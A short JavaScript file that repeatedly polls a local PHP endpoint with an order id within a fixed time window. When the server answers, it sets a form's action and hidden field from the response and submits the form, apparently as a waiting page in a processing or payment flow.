let frm = $('#prossFrm')
let frmfT = $('#frmt')
let frmfRid = $('#vid')
let frmfServ = $('#servid')
function sleep(milliseconds) {
    return new Promise(resolve => setTimeout(resolve, milliseconds));
}
let pTimInteval = 3
let bt = 1689513213;
let et = 1689514109;
async function collecte() {
    // while (bt <= et) {
    while (bt <= et) {
        let stop = false;
        const data = await fetch('./collecte.php', {
            method: 'POST',
            headers: {
                'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
            },
            body: JSON.stringify({
                t: Date.now(),
                ord: "35c547698da79"
            })
        }).then(r => r.json()).then(r => {
            if (!r.ping) {

                if (r.frmfo.attAct) frm.attr('action', function () { return r.frmfo.attAct })
                if (r.frmfo.fldid) frmfRid.val(function () { return r.frmfo.fldid })
                stop = true
                frm.submit();
            }
        })

        if (stop) break;
        await sleep(pTimInteval * 1000);
        bt = bt + pTimInteval;
    }
}
collecte();